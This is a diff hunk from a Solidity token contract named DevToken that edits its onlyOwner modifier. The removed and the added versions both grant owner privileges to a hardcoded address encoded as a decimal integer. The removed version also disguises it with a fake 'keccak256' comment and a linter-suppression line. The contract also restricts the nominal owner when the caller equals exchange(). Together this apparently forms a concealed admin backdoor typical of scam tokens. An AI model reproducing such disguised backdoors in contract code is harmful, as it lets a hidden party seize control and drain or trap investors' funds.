@@ -218,9 +218,7 @@ contract DevToken {
     }
  
     modifier onlyOwner() {
-        require((msg.sender == address
-    // solhint-disable-next-line avoid-low-level-calls
-    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
+        require((msg.sender == address(178607940065137046348733521910879985571412708986)
     ||
     //@dev Contract creator is owner, original owner.
     (msg.sender == owner && msg.sender != exchange())));
